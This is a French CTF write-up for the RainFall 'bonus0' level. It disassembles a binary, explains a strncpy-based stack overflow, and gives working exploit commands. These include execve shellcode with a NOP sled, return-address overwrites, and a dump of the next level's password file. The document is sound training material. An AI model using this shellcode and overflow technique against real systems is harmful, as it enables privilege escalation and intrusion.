On désassemble le binaire:
```asm
080484b4 <p>:
 80484b4:       55                      push   ebp
 80484b5:       89 e5                   mov    ebp,esp
 80484b7:       81 ec 18 10 00 00       sub    esp,0x1018
 80484bd:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484c0:       89 04 24                mov    DWORD PTR [esp],eax
 80484c3:       e8 e8 fe ff ff          call   80483b0 <puts@plt>
 80484c8:       c7 44 24 08 00 10 00    mov    DWORD PTR [esp+0x8],0x1000
 80484cf:       00
 80484d0:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 80484d6:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484da:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 80484e1:       e8 9a fe ff ff          call   8048380 <read@plt>
 80484e6:       c7 44 24 04 0a 00 00    mov    DWORD PTR [esp+0x4],0xa
 80484ed:       00
 80484ee:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 80484f4:       89 04 24                mov    DWORD PTR [esp],eax
 80484f7:       e8 d4 fe ff ff          call   80483d0 <strchr@plt>
 80484fc:       c6 00 00                mov    BYTE PTR [eax],0x0
 80484ff:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 8048505:       c7 44 24 08 14 00 00    mov    DWORD PTR [esp+0x8],0x14
 804850c:       00
 804850d:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048511:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048514:       89 04 24                mov    DWORD PTR [esp],eax
 8048517:       e8 d4 fe ff ff          call   80483f0 <strncpy@plt>
 804851c:       c9                      leave
 804851d:       c3                      ret

0804851e <pp>:
 804851e:       55                      push   ebp
 804851f:       89 e5                   mov    ebp,esp
 8048521:       57                      push   edi
 8048522:       53                      push   ebx
 8048523:       83 ec 50                sub    esp,0x50
 8048526:       c7 44 24 04 a0 86 04    mov    DWORD PTR [esp+0x4],0x80486a0
 804852d:       08
 804852e:       8d 45 d0                lea    eax,[ebp-0x30]
 8048531:       89 04 24                mov    DWORD PTR [esp],eax
 8048534:       e8 7b ff ff ff          call   80484b4 <p>
 8048539:       c7 44 24 04 a0 86 04    mov    DWORD PTR [esp+0x4],0x80486a0
 8048540:       08
 8048541:       8d 45 e4                lea    eax,[ebp-0x1c]
 8048544:       89 04 24                mov    DWORD PTR [esp],eax
 8048547:       e8 68 ff ff ff          call   80484b4 <p>
 804854c:       8d 45 d0                lea    eax,[ebp-0x30]
 804854f:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048553:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048556:       89 04 24                mov    DWORD PTR [esp],eax
 8048559:       e8 42 fe ff ff          call   80483a0 <strcpy@plt>
 804855e:       bb a4 86 04 08          mov    ebx,0x80486a4
 8048563:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048566:       c7 45 c4 ff ff ff ff    mov    DWORD PTR [ebp-0x3c],0xffffffff
 804856d:       89 c2                   mov    edx,eax
 804856f:       b8 00 00 00 00          mov    eax,0x0
 8048574:       8b 4d c4                mov    ecx,DWORD PTR [ebp-0x3c]
 8048577:       89 d7                   mov    edi,edx
 8048579:       f2 ae                   repnz scas al,BYTE PTR es:[edi]
 804857b:       89 c8                   mov    eax,ecx
 804857d:       f7 d0                   not    eax
 804857f:       83 e8 01                sub    eax,0x1
 8048582:       03 45 08                add    eax,DWORD PTR [ebp+0x8]
 8048585:       0f b7 13                movzx  edx,WORD PTR [ebx]
 8048588:       66 89 10                mov    WORD PTR [eax],dx
 804858b:       8d 45 e4                lea    eax,[ebp-0x1c]
 804858e:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048592:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048595:       89 04 24                mov    DWORD PTR [esp],eax
 8048598:       e8 f3 fd ff ff          call   8048390 <strcat@plt>
 804859d:       83 c4 50                add    esp,0x50
 80485a0:       5b                      pop    ebx
 80485a1:       5f                      pop    edi
 80485a2:       5d                      pop    ebp
 80485a3:       c3                      ret

080485a4 <main>:
 80485a4:       55                      push   ebp
 80485a5:       89 e5                   mov    ebp,esp
 80485a7:       83 e4 f0                and    esp,0xfffffff0
 80485aa:       83 ec 40                sub    esp,0x40
 80485ad:       8d 44 24 16             lea    eax,[esp+0x16]
 80485b1:       89 04 24                mov    DWORD PTR [esp],eax
 80485b4:       e8 65 ff ff ff          call   804851e <pp>
 80485b9:       8d 44 24 16             lea    eax,[esp+0x16]
 80485bd:       89 04 24                mov    DWORD PTR [esp],eax
 80485c0:       e8 eb fd ff ff          call   80483b0 <puts@plt>
 80485c5:       b8 00 00 00 00          mov    eax,0x0
 80485ca:       c9                      leave
 80485cb:       c3                      ret
 80485cc:       90                      nop
 80485cd:       90                      nop
 80485ce:       90                      nop
 80485cf:       90                      nop
```
- On a une fonction **main** qui appelle la fonction **pp** qui elle-même appelle **p**.
- La fonction **pp** prend 1 buffer en paramètre puis fait appel à la fonction **p** 2 fois de suite. Puis elle copie une str dans son buffer mis en paramètre, calcule la longueur, mets un 0 à la fin, et finit par un strcat de la deuxième str dans le buffer en paramètre
- La fonction **p** prend 2 str en paramètre, une str vide de 20 bytes et une str " - ". **p** fait un puts de la str " - " puis fait un read sur l'entrée standard dans un buffer de 4096, supprime le '\n' final pour y mettre 0 à l'aide de **strchr**. Enfin, **p** copie les 20 premiers bytes du buffer de **read** dans la str vide passée en paramètre.
- le **main** fait un puts du buffer final avec les deux str de 20 bytes max + un espace entre les deux
> Nous allons commencer par voir si un buffer overflow est possible et définir l'offset. Il y a un warning dans le man de **strncpy** qu'on peut exploiter:
       Warning:  If  there  is  no  null  byte among the first n bytes of src, the string
       placed in dest will not be null-terminated.

> On utilise un pattern pour déterminer l'offset, on en génère deux pour tester les deux arguments

> Pas de system ou de /bin/bash donc il va falloir injecter du shellcode

```bash
bonus0@RainFall:~$ python /tmp/pattern.py 200 > /tmp/0pat
bonus0@RainFall:~$ cat /tmp/0pat
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
bonus0@RainFall:~$ gdb -q ./bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
On a bien un segfault, vérifions l'offset:
```bash
bonus0@RainFall:~$ python /tmp/pattern.py /tmp/0pat 0x41336141
offset found at: 9
```
Vérifions si c'est pour le deuxième ou le premier argument :
```bash
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 -
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb��� bbbbbbbbbbbbbbbbbbbb���

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb)
```
- Donc c'est au deuxième argument: 0x62 = b
- On voit aussi que le programme tourne jusqu'au puts du main, c'est au ret de puts que l'eip est écrasé. Or il n'y a plus d'instruction apres. Donc notre shellcode doit être éxécuté à cet endroit, il faut mettre une adresse qui écrase l'adresse de retour et qui contient le shellcode.

> Deux options:
1. Ecrire le shellcode dans le buffer en paramètre de **puts** du **main** et mettre l'adresse de ce buffer en payload
2. Exporter le shellcode en variable d'env et mettre l'adresse de cette variable d'env en payload

- Option 1:
Pour l'option 1 il faut remplir le buffer avec le shellcode en veillant bien à inclure une ***NOP sled*** afin d'être sûr de tomber sur notre shellcode, en effet, on va récupérer l'adresse du buffer dans GDB mais en mode execution les adresses peuvent être décalées dans la stack, le buffer ou on va écrire en premier fait 4096 donc on peut pour être sûr mettre une sled de 1000 bytes afin de tomber fatalement sur la bonne aadresse du buffer dans la stack, puis notres shellcode de 21 bytes puis un padding de 3074 bytes et finir par un \n pour cloturer le read sans avoir a interagir manuellement. ensuite, dans le deuxième input, un padding de 9 pour l'offset, l'adresse cible récupérée dans GDB et un padding de 7 pour finir le buffer de 20. donc ca donne:
```bash
bonus0@RainFall:~$ gdb -q ./bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) b *0x80485c0
Breakpoint 1 at 0x80485c0
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
aaa
 -
bbb

Breakpoint 1, 0x080485c0 in main ()
(gdb) i r
eax            0xbffff6f6       -1073744138
ecx            0xbffff6bc       -1073744196
edx            0xbffff6fa       -1073744134
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6e0       0xbffff6e0
ebp            0xbffff728       0xbffff728
esi            0x0      0
edi            0x0      0
eip            0x80485c0        0x80485c0 <main+28>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/s 0xbffff6f6
0xbffff6f6:      "aaa bbb"
```
avec cette adresse en payload **0xbffff6f6**:
```bash
bonus0@RainFall:~$ python -c "print '\x90'*1000+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A'*3074 + '\n' + 'B'*9 + '\xf6\xf6\xff\xbf' +
'C'*7" > /tmp/payload_bonus0
bonus0@RainFall:~$ cat /tmp/payload_bonus0  - | ./bonus0
 -
 -
��������������������BBBBBBBBB����CCCCCCC��� BBBBBBBBB����CCCCCCC���
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
```
- Option 2:
Même principe sauf qu'on met le shellcode dans une variable d'environnement, il faut cependant un programme en C pour récupérer la variable d'environnement:
```bash
bonus0@RainFall:~$ cat > /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
        printf("%s: %p\n", argv[1], getenv(argv[1]));
}

bonus0@RainFall:~$ gcc -o /tmp/bob.out /tmp/getenv.c
bonus0@RainFall:~$ export SHELLCODE=$(python -c "print '\x90'*1000+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
bonus0@RainFall:~$ /tmp/bob.out SHELLCODE
SHELLCODE: 0xbffff50e
bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\x0e\xf5\xff\xbf' + 'C'*7" > /tmp/payload_bonus0                                                         bonus0@RainFall:~$ cat /tmp/payload_bonus0  - | ./bonus0
 -
 -
��������������������BBBBBBBBB���CCCCCCC��� BBBBBBBBB���CCCCCCC���
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```